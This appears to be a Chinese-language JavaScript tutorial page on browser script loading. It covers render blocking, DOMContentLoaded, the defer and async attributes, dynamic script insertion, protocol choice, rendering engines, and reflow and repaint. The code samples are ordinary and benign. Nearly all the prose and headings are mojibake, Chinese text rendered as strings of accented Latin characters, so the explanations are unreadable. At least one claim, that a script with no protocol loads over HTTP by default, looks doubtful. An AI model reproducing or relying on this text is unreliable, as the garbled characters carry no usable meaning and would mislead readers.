<p>åŠ è½½å¤–éƒ¨è„šæœ¬æ—¶ï¼Œæµè§ˆå™¨ä¼šæš‚åœé¡µé¢æ¸²æŸ“ï¼Œç­‰å¾…è„šæœ¬ä¸‹è½½å¹¶æ‰§è¡Œå®Œæˆåï¼Œå†ç»§ç»­æ¸²æŸ“ã€‚åŸå› æ˜¯ JavaScript ä»£ç å¯ä»¥ä¿®æ”¹ DOMï¼Œæ‰€ä»¥å¿…é¡»æŠŠæ§åˆ¶æƒè®©ç»™å®ƒï¼Œå¦åˆ™ä¼šå¯¼è‡´å¤æ‚çš„çº¿ç¨‹ç«èµ›çš„é—®é¢˜ã€‚</p>
<p>å¦‚æœå¤–éƒ¨è„šæœ¬åŠ è½½æ—¶é—´å¾ˆé•¿ï¼ˆä¸€ç›´æ— æ³•å®Œæˆä¸‹è½½ï¼‰ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šä¸€ç›´ç­‰å¾…è„šæœ¬ä¸‹è½½å®Œæˆï¼Œé€ æˆç½‘é¡µé•¿æ—¶é—´å¤±å»å“åº”ï¼Œæµè§ˆå™¨å°±ä¼šå‘ˆç°â€œå‡æ­»â€çŠ¶æ€ï¼Œè¿™è¢«ç§°ä¸ºâ€œé˜»å¡æ•ˆåº”â€ã€‚</p>
<p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œè¾ƒå¥½çš„åšæ³•æ˜¯å°†<code>&lt;script&gt;</code>æ ‡ç­¾éƒ½æ”¾åœ¨é¡µé¢åº•éƒ¨ï¼Œè€Œä¸æ˜¯å¤´éƒ¨ã€‚è¿™æ ·å³ä½¿é‡åˆ°è„šæœ¬å¤±å»å“åº”ï¼Œç½‘é¡µä¸»ä½“çš„æ¸²æŸ“ä¹Ÿå·²ç»å®Œæˆäº†ï¼Œç”¨æˆ·è‡³å°‘å¯ä»¥çœ‹åˆ°å†…å®¹ï¼Œè€Œä¸æ˜¯é¢å¯¹ä¸€å¼ ç©ºç™½çš„é¡µé¢ã€‚å¦‚æœæŸäº›è„šæœ¬ä»£ç éå¸¸é‡è¦ï¼Œä¸€å®šè¦æ”¾åœ¨é¡µé¢å¤´éƒ¨çš„è¯ï¼Œæœ€å¥½ç›´æ¥å°†ä»£ç å†™å…¥é¡µé¢ï¼Œè€Œä¸æ˜¯è¿æ¥å¤–éƒ¨è„šæœ¬æ–‡ä»¶ï¼Œè¿™æ ·èƒ½ç¼©çŸ­åŠ è½½æ—¶é—´ã€‚</p>
<p>è„šæœ¬æ–‡ä»¶éƒ½æ”¾åœ¨ç½‘é¡µå°¾éƒ¨åŠ è½½ï¼Œè¿˜æœ‰ä¸€ä¸ªå¥½å¤„ã€‚å› ä¸ºåœ¨ DOM ç»“æ„ç”Ÿæˆä¹‹å‰å°±è°ƒç”¨ DOM èŠ‚ç‚¹ï¼ŒJavaScript ä¼šæŠ¥é”™ï¼Œå¦‚æœè„šæœ¬éƒ½åœ¨ç½‘é¡µå°¾éƒ¨åŠ è½½ï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºè¿™æ—¶ DOM è‚¯å®šå·²ç»ç”Ÿæˆäº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    console.log(document.body.innerHTML);</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æ‰§è¡Œæ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ­¤æ—¶<code>document.body</code>å…ƒç´ è¿˜æœªç”Ÿæˆã€‚</p>
<p>ä¸€ç§è§£å†³æ–¹æ³•æ˜¯è®¾å®š<code>DOMContentLoaded</code>äº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    document.addEventListener(</span><br><span class="line">      &#39;DOMContentLoaded&#39;,</span><br><span class="line">      function (event) &#123;</span><br><span class="line">        console.log(document.body.innerHTML);</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŒ‡å®š<code>DOMContentLoaded</code>äº‹ä»¶å‘ç”Ÿåï¼Œæ‰å¼€å§‹æ‰§è¡Œç›¸å…³ä»£ç ã€‚<code>DOMContentLoaded</code>äº‹ä»¶åªæœ‰åœ¨ DOM ç»“æ„ç”Ÿæˆä¹‹åæ‰ä¼šè§¦å‘ã€‚</p>
<p>å¦ä¸€ç§è§£å†³æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨<code>&lt; script&gt;</code>æ ‡ç­¾çš„<code>onload</code>å±æ€§ã€‚å½“<code>&lt; script&gt;</code>æ ‡ç­¾æŒ‡å®šçš„å¤–éƒ¨è„šæœ¬æ–‡ä»¶ä¸‹è½½å’Œè§£æå®Œæˆï¼Œä¼šè§¦å‘ä¸€ä¸ª<code>load</code>äº‹ä»¶ï¼Œå¯ä»¥æŠŠæ‰€éœ€æ‰§è¡Œçš„ä»£ç ï¼Œæ”¾åœ¨è¿™ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°é‡Œé¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;jquery.min.js&quot; onload&#x3D;&quot;console.log(document.body.innerHTML)&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ï¼Œå¦‚æœå°†è„šæœ¬æ”¾åœ¨é¡µé¢åº•éƒ¨ï¼Œå°±å¯ä»¥å®Œå…¨æŒ‰ç…§æ­£å¸¸çš„æ–¹å¼å†™ï¼Œä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½ä¸éœ€è¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;!-- å…¶ä»–ä»£ç   --&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    console.log(document.body.innerHTML);</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰å¤šä¸ª<code>script</code>æ ‡ç­¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;a.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;b.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨ä¼šåŒæ—¶å¹¶è¡Œä¸‹è½½<code>a.js</code>å’Œ<code>b.js</code>ï¼Œä½†æ˜¯ï¼Œæ‰§è¡Œæ—¶ä¼šä¿è¯å…ˆæ‰§è¡Œ<code>a.js</code>ï¼Œç„¶åå†æ‰§è¡Œ<code>b.js</code>ï¼Œå³ä½¿åè€…å…ˆä¸‹è½½å®Œæˆï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè„šæœ¬çš„æ‰§è¡Œé¡ºåºç”±å®ƒä»¬åœ¨é¡µé¢ä¸­çš„å‡ºç°é¡ºåºå†³å®šï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯è„šæœ¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ä¸å—åˆ°ç ´åã€‚å½“ç„¶ï¼ŒåŠ è½½è¿™ä¸¤ä¸ªè„šæœ¬éƒ½ä¼šäº§ç”Ÿâ€œé˜»å¡æ•ˆåº”â€ï¼Œå¿…é¡»ç­‰åˆ°å®ƒä»¬éƒ½åŠ è½½å®Œæˆï¼Œæµè§ˆå™¨æ‰ä¼šç»§ç»­é¡µé¢æ¸²æŸ“ã€‚</p>
<p>è§£æå’Œæ‰§è¡Œ CSSï¼Œä¹Ÿä¼šäº§ç”Ÿé˜»å¡ã€‚Firefox æµè§ˆå™¨ä¼šç­‰åˆ°è„šæœ¬å‰é¢çš„æ‰€æœ‰æ ·å¼è¡¨ï¼Œéƒ½ä¸‹è½½å¹¶è§£æå®Œï¼Œå†æ‰§è¡Œè„šæœ¬ï¼›Webkitåˆ™æ˜¯ä¸€æ—¦å‘ç°è„šæœ¬å¼•ç”¨äº†æ ·å¼ï¼Œå°±ä¼šæš‚åœæ‰§è¡Œè„šæœ¬ï¼Œç­‰åˆ°æ ·å¼è¡¨ä¸‹è½½å¹¶è§£æå®Œï¼Œå†æ¢å¤æ‰§è¡Œã€‚</p>
<p>æ­¤å¤–ï¼Œå¯¹äºæ¥è‡ªåŒä¸€ä¸ªåŸŸåçš„èµ„æºï¼Œæ¯”å¦‚è„šæœ¬æ–‡ä»¶ã€æ ·å¼è¡¨æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ç­‰ï¼Œæµè§ˆå™¨ä¸€èˆ¬æœ‰é™åˆ¶ï¼ŒåŒæ—¶æœ€å¤šä¸‹è½½6ï½20ä¸ªèµ„æºï¼Œå³æœ€å¤šåŒæ—¶æ‰“å¼€çš„ TCP è¿æ¥æœ‰é™åˆ¶ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å¯¹æœåŠ¡å™¨é€ æˆå¤ªå¤§å‹åŠ›ã€‚å¦‚æœæ˜¯æ¥è‡ªä¸åŒåŸŸåçš„èµ„æºï¼Œå°±æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚æ‰€ä»¥ï¼Œé€šå¸¸æŠŠé™æ€æ–‡ä»¶æ”¾åœ¨ä¸åŒçš„åŸŸåä¹‹ä¸‹ï¼Œä»¥åŠ å¿«ä¸‹è½½é€Ÿåº¦ã€‚</p>
<h5 id="defer-å±æ€§"><a href="#defer-å±æ€§" class="headerlink" title="defer å±æ€§"></a>defer å±æ€§</h5><p>ä¸ºäº†è§£å†³è„šæœ¬æ–‡ä»¶ä¸‹è½½é˜»å¡ç½‘é¡µæ¸²æŸ“çš„é—®é¢˜ï¼Œä¸€ä¸ªæ–¹æ³•æ˜¯å¯¹<code>&lt;script&gt;</code>å…ƒç´ åŠ å…¥<code>defer</code>å±æ€§ã€‚å®ƒçš„ä½œç”¨æ˜¯å»¶è¿Ÿè„šæœ¬çš„æ‰§è¡Œï¼Œç­‰åˆ° DOM åŠ è½½ç”Ÿæˆåï¼Œå†æ‰§è¡Œè„šæœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;a.js&quot; defer&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;b.js&quot; defer&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œåªæœ‰ç­‰åˆ° DOM åŠ è½½å®Œæˆåï¼Œæ‰ä¼šæ‰§è¡Œ<code>a.js</code>å’Œ<code>b.js</code>ã€‚</p>
<p><code>defer</code>å±æ€§çš„è¿è¡Œæµç¨‹å¦‚ä¸‹ã€‚</p>
<ol>
<li>æµè§ˆå™¨å¼€å§‹è§£æ HTML ç½‘é¡µã€‚</li>
<li>è§£æè¿‡ç¨‹ä¸­ï¼Œå‘ç°å¸¦æœ‰<code>defer</code>å±æ€§çš„<code>&lt;script&gt;</code>å…ƒç´ ã€‚</li>
<li>æµè§ˆå™¨ç»§ç»­å¾€ä¸‹è§£æ HTML ç½‘é¡µï¼ŒåŒæ—¶å¹¶è¡Œä¸‹è½½<code>&lt;script&gt;</code>å…ƒç´ åŠ è½½çš„å¤–éƒ¨è„šæœ¬ã€‚</li>
<li>æµè§ˆå™¨å®Œæˆè§£æ HTML ç½‘é¡µï¼Œæ­¤æ—¶å†å›è¿‡å¤´æ‰§è¡Œå·²ç»ä¸‹è½½å®Œæˆçš„è„šæœ¬ã€‚</li>
</ol>
<p>æœ‰äº†<code>defer</code>å±æ€§ï¼Œæµè§ˆå™¨ä¸‹è½½è„šæœ¬æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ã€‚ä¸‹è½½çš„è„šæœ¬æ–‡ä»¶åœ¨<code>DOMContentLoaded</code>äº‹ä»¶è§¦å‘å‰æ‰§è¡Œï¼ˆå³åˆšåˆšè¯»å–å®Œ<code>&lt;/html&gt;</code>æ ‡ç­¾ï¼‰ï¼Œè€Œä¸”å¯ä»¥ä¿è¯æ‰§è¡Œé¡ºåºå°±æ˜¯å®ƒä»¬åœ¨é¡µé¢ä¸Šå‡ºç°çš„é¡ºåºã€‚</p>
<p>å¯¹äºå†…ç½®è€Œä¸æ˜¯åŠ è½½å¤–éƒ¨è„šæœ¬çš„<code>script</code>æ ‡ç­¾ï¼Œä»¥åŠåŠ¨æ€ç”Ÿæˆçš„<code>script</code>æ ‡ç­¾ï¼Œ<code>defer</code>å±æ€§ä¸èµ·ä½œç”¨ã€‚å¦å¤–ï¼Œä½¿ç”¨<code>defer</code>åŠ è½½çš„å¤–éƒ¨è„šæœ¬ä¸åº”è¯¥ä½¿ç”¨<code>document.write</code>æ–¹æ³•ã€‚</p>
<h3 id="async-å±æ€§"><a href="#async-å±æ€§" class="headerlink" title="async å±æ€§"></a>async å±æ€§</h3><p>è§£å†³â€œé˜»å¡æ•ˆåº”â€çš„å¦ä¸€ä¸ªæ–¹æ³•æ˜¯å¯¹<code>&lt;script&gt;</code>å…ƒç´ åŠ å…¥<code>async</code>å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;a.js&quot; async&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;b.js&quot; async&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><code>async</code>å±æ€§çš„ä½œç”¨æ˜¯ï¼Œä½¿ç”¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸‹è½½è„šæœ¬ï¼Œä¸‹è½½æ—¶ä¸ä¼šé˜»å¡æ¸²æŸ“ã€‚</p>
<ol>
<li>æµè§ˆå™¨å¼€å§‹è§£æ HTML ç½‘é¡µã€‚</li>
<li>è§£æè¿‡ç¨‹ä¸­ï¼Œå‘ç°å¸¦æœ‰<code>async</code>å±æ€§çš„<code>script</code>æ ‡ç­¾ã€‚</li>
<li>æµè§ˆå™¨ç»§ç»­å¾€ä¸‹è§£æ HTML ç½‘é¡µï¼ŒåŒæ—¶å¹¶è¡Œä¸‹è½½<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­çš„å¤–éƒ¨è„šæœ¬ã€‚</li>
<li>è„šæœ¬ä¸‹è½½å®Œæˆï¼Œæµè§ˆå™¨æš‚åœè§£æ HTML ç½‘é¡µï¼Œå¼€å§‹æ‰§è¡Œä¸‹è½½çš„è„šæœ¬ã€‚</li>
<li>è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œæµè§ˆå™¨æ¢å¤è§£æ HTML ç½‘é¡µã€‚</li>
</ol>
<p><code>async</code>å±æ€§å¯ä»¥ä¿è¯è„šæœ¬ä¸‹è½½çš„åŒæ—¶ï¼Œæµè§ˆå™¨ç»§ç»­æ¸²æŸ“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦é‡‡ç”¨è¿™ä¸ªå±æ€§ï¼Œå°±æ— æ³•ä¿è¯è„šæœ¬çš„æ‰§è¡Œé¡ºåºã€‚å“ªä¸ªè„šæœ¬å…ˆä¸‹è½½ç»“æŸï¼Œå°±å…ˆæ‰§è¡Œé‚£ä¸ªè„šæœ¬ã€‚å¦å¤–ï¼Œä½¿ç”¨<code>async</code>å±æ€§çš„è„šæœ¬æ–‡ä»¶é‡Œé¢çš„ä»£ç ï¼Œä¸åº”è¯¥ä½¿ç”¨<code>document.write</code>æ–¹æ³•ã€‚</p>
<p><code>defer</code>å±æ€§å’Œ<code>async</code>å±æ€§åˆ°åº•åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªï¼Ÿ</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœè„šæœ¬ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œå°±ä½¿ç”¨<code>async</code>å±æ€§ï¼Œå¦‚æœè„šæœ¬ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œå°±ä½¿ç”¨<code>defer</code>å±æ€§ã€‚å¦‚æœåŒæ—¶ä½¿ç”¨<code>async</code>å’Œ<code>defer</code>å±æ€§ï¼Œåè€…ä¸èµ·ä½œç”¨ï¼Œæµè§ˆå™¨è¡Œä¸ºç”±<code>async</code>å±æ€§å†³å®šã€‚</p>
<h4 id="è„šæœ¬çš„åŠ¨æ€åŠ è½½"><a href="#è„šæœ¬çš„åŠ¨æ€åŠ è½½" class="headerlink" title="è„šæœ¬çš„åŠ¨æ€åŠ è½½"></a>è„šæœ¬çš„åŠ¨æ€åŠ è½½</h4><p>&lt; script &gt;å…ƒç´ è¿˜å¯ä»¥åŠ¨æ€ç”Ÿæˆï¼Œç”Ÿæˆåå†æ’å…¥é¡µé¢ï¼Œä»è€Œå®ç°è„šæœ¬çš„åŠ¨æ€åŠ è½½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#39;a.js&#39;, &#39;b.js&#39;].forEach(function(src) &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.src &#x3D; src;</span><br><span class="line">  document.head.appendChild(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>è¿™ç§æ–¹æ³•çš„å¥½å¤„æ˜¯ï¼ŒåŠ¨æ€ç”Ÿæˆçš„<code>script</code>æ ‡ç­¾ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œä¹Ÿå°±ä¸ä¼šé€ æˆæµè§ˆå™¨å‡æ­»ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œè¿™ç§æ–¹æ³•æ— æ³•ä¿è¯è„šæœ¬çš„æ‰§è¡Œé¡ºåºï¼Œå“ªä¸ªè„šæœ¬æ–‡ä»¶å…ˆä¸‹è½½å®Œæˆï¼Œå°±å…ˆæ‰§è¡Œå“ªä¸ªã€‚</p>
<p>å¦‚æœæƒ³é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è®¾ç½®asyncå±æ€§ä¸º<code>false</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[&#39;a.js&#39;, &#39;b.js&#39;].forEach(function(src) &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.src &#x3D; src;</span><br><span class="line">  script.async &#x3D; false;</span><br><span class="line">  document.head.appendChild(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œè€Œä¸”å¯ä»¥ä¿è¯<code>b.js</code>åœ¨<code>a.js</code>åé¢æ‰§è¡Œã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™æ®µä»£ç åé¢åŠ è½½çš„è„šæœ¬æ–‡ä»¶ï¼Œä¼šå› æ­¤éƒ½ç­‰å¾…<code>b.js</code>æ‰§è¡Œå®Œæˆåå†æ‰§è¡Œã€‚</p>
<p>å¦‚æœæƒ³ä¸ºåŠ¨æ€åŠ è½½çš„è„šæœ¬æŒ‡å®šå›è°ƒå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function loadScript(src, done) &#123;</span><br><span class="line">  var js &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  js.src &#x3D; src;</span><br><span class="line">  js.onload &#x3D; function() &#123;</span><br><span class="line">    done();</span><br><span class="line">  &#125;;</span><br><span class="line">  js.onerror &#x3D; function() &#123;</span><br><span class="line">    done(new Error(&#39;Failed to load script &#39; + src));</span><br><span class="line">  &#125;;</span><br><span class="line">  document.head.appendChild(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åŠ è½½ä½¿ç”¨çš„åè®®"><a href="#åŠ è½½ä½¿ç”¨çš„åè®®" class="headerlink" title="åŠ è½½ä½¿ç”¨çš„åè®®"></a>åŠ è½½ä½¿ç”¨çš„åè®®</h4><p>å¦‚æœä¸æŒ‡å®šåè®®ï¼Œæµè§ˆå™¨é»˜è®¤é‡‡ç”¨ HTTP åè®®ä¸‹è½½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„<code>example.js</code>é»˜è®¤å°±æ˜¯é‡‡ç”¨ HTTP åè®®ä¸‹è½½ï¼Œå¦‚æœè¦é‡‡ç”¨ HTTPS åè®®ä¸‹è½½ï¼Œå¿…éœ€å†™æ˜ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æœ‰æ—¶æˆ‘ä»¬ä¼šå¸Œæœ›ï¼Œæ ¹æ®é¡µé¢æœ¬èº«çš„åè®®æ¥å†³å®šåŠ è½½åè®®ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;&#x2F;example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="æµè§ˆå™¨çš„ç»„æˆ"><a href="#æµè§ˆå™¨çš„ç»„æˆ" class="headerlink" title="æµè§ˆå™¨çš„ç»„æˆ"></a>æµè§ˆå™¨çš„ç»„æˆ</h3><p>æµè§ˆå™¨çš„æ ¸å¿ƒæ˜¯ä¸¤éƒ¨åˆ†ï¼šæ¸²æŸ“å¼•æ“å’Œ JavaScript è§£é‡Šå™¨ï¼ˆåˆç§° JavaScript å¼•æ“ï¼‰ã€‚</p>
<h4 id="æ¸²æŸ“å¼•æ“"><a href="#æ¸²æŸ“å¼•æ“" class="headerlink" title="æ¸²æŸ“å¼•æ“"></a>æ¸²æŸ“å¼•æ“</h4><p>æ¸²æŸ“å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œå°†ç½‘é¡µä»£ç æ¸²æŸ“ä¸ºç”¨æˆ·è§†è§‰å¯ä»¥æ„ŸçŸ¥çš„å¹³é¢æ–‡æ¡£ã€‚</p>
<p>ä¸åŒçš„æµè§ˆå™¨æœ‰ä¸åŒçš„æ¸²æŸ“å¼•æ“ã€‚</p>
<ul>
<li>Firefoxï¼šGecko å¼•æ“</li>
<li>Safariï¼šWebKit å¼•æ“</li>
<li>Chromeï¼šBlink å¼•æ“</li>
<li>IE: Trident å¼•æ“</li>
<li>Edge: EdgeHTML å¼•æ“</li>
</ul>
<p>æ¸²æŸ“å¼•æ“å¤„ç†ç½‘é¡µï¼Œé€šå¸¸åˆ†æˆå››ä¸ªé˜¶æ®µã€‚</p>
<ol>
<li>è§£æä»£ç ï¼šHTML ä»£ç è§£æä¸º DOMï¼ŒCSS ä»£ç è§£æä¸º CSSOMï¼ˆCSS Object Modelï¼‰ã€‚</li>
<li>å¯¹è±¡åˆæˆï¼šå°† DOM å’Œ CSSOM åˆæˆä¸€æ£µæ¸²æŸ“æ ‘ï¼ˆrender treeï¼‰ã€‚</li>
<li>å¸ƒå±€ï¼šè®¡ç®—å‡ºæ¸²æŸ“æ ‘çš„å¸ƒå±€ï¼ˆlayoutï¼‰ã€‚</li>
<li>ç»˜åˆ¶ï¼šå°†æ¸²æŸ“æ ‘ç»˜åˆ¶åˆ°å±å¹•ã€‚</li>
</ol>
<p>ä»¥ä¸Šå››æ­¥å¹¶éä¸¥æ ¼æŒ‰é¡ºåºæ‰§è¡Œï¼Œå¾€å¾€ç¬¬ä¸€æ­¥è¿˜æ²¡å®Œæˆï¼Œç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥å°±å·²ç»å¼€å§‹äº†ã€‚æ‰€ä»¥ï¼Œä¼šçœ‹åˆ°è¿™ç§æƒ…å†µï¼šç½‘é¡µçš„ HTML ä»£ç è¿˜æ²¡ä¸‹è½½å®Œï¼Œä½†æµè§ˆå™¨å·²ç»æ˜¾ç¤ºå‡ºå†…å®¹äº†ã€‚</p>
<h4 id="é‡æµå’Œé‡ç»˜"><a href="#é‡æµå’Œé‡ç»˜" class="headerlink" title="é‡æµå’Œé‡ç»˜"></a>é‡æµå’Œé‡ç»˜</h4><p>æ¸²æŸ“æ ‘è½¬æ¢ä¸ºç½‘é¡µå¸ƒå±€ï¼Œç§°ä¸ºâ€œå¸ƒå±€æµâ€ï¼ˆflowï¼‰ï¼›å¸ƒå±€æ˜¾ç¤ºåˆ°é¡µé¢çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œç§°ä¸ºâ€œç»˜åˆ¶â€ï¼ˆpaintï¼‰ã€‚å®ƒä»¬éƒ½å…·æœ‰é˜»å¡æ•ˆåº”ï¼Œå¹¶ä¸”ä¼šè€—è´¹å¾ˆå¤šæ—¶é—´å’Œè®¡ç®—èµ„æºã€‚</p>
<p>é¡µé¢ç”Ÿæˆä»¥åï¼Œè„šæœ¬æ“ä½œå’Œæ ·å¼è¡¨æ“ä½œï¼Œéƒ½ä¼šè§¦å‘â€œé‡æµâ€ï¼ˆreflowï¼‰å’Œâ€œé‡ç»˜â€ï¼ˆrepaintï¼‰ã€‚ç”¨æˆ·çš„äº’åŠ¨ä¹Ÿä¼šè§¦å‘é‡æµå’Œé‡ç»˜ï¼Œæ¯”å¦‚è®¾ç½®äº†é¼ æ ‡æ‚¬åœï¼ˆ<code>a:hover</code>ï¼‰æ•ˆæœã€é¡µé¢æ»šåŠ¨ã€åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æ–‡æœ¬ã€æ”¹å˜çª—å£å¤§å°ç­‰ç­‰ã€‚</p>
<p>é‡æµå’Œé‡ç»˜å¹¶ä¸ä¸€å®šä¸€èµ·å‘ç”Ÿï¼Œé‡æµå¿…ç„¶å¯¼è‡´é‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šéœ€è¦é‡æµã€‚æ¯”å¦‚æ”¹å˜å…ƒç´ é¢œè‰²ï¼Œåªä¼šå¯¼è‡´é‡ç»˜ï¼Œè€Œä¸ä¼šå¯¼è‡´é‡æµï¼›æ”¹å˜å…ƒç´ çš„å¸ƒå±€ï¼Œåˆ™ä¼šå¯¼è‡´é‡ç»˜å’Œé‡æµã€‚</p>
<p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šæ™ºèƒ½åˆ¤æ–­ï¼Œå°†é‡æµå’Œé‡ç»˜åªé™åˆ¶åˆ°ç›¸å…³çš„å­æ ‘ä¸Šé¢ï¼Œæœ€å°åŒ–æ‰€è€—è´¹çš„ä»£ä»·ï¼Œè€Œä¸ä¼šå…¨å±€é‡æ–°ç”Ÿæˆç½‘é¡µã€‚</p>
